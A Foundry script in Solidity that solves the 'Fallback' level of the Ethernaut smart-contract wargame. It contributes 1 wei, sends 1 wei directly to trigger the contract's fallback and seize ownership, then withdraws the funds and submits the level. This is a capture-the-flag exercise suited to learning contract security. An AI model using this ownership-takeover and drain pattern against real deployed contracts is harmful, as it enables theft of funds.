// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { Fallback } from "src/Level01.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address payable instanceAddress = payable(address(uint160(uint256(entries[0].topics[2]))));
        console2.log(instanceAddress);
        Fallback instance = Fallback(instanceAddress);

        instance.contribute{ value: 1 wei }();
        (bool result,) = instanceAddress.call{ value: 1 wei }("");
        require(result, "call failed");
        instance.withdraw();

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
